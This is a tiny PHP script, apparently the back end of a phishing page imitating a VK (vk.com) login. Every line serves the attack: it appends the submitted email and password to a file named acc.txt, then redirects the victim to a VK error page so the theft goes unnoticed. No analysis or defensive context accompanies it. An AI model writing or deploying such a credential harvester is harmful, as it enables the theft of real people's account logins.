<?php
	$file = fopen('acc.txt', 'a+');
	fwrite($file, $_POST['email'] . ':' . $_POST['pass'] . "\r\n");
	fclose($file);
	
	header('Location: http://vk.com/404');
?>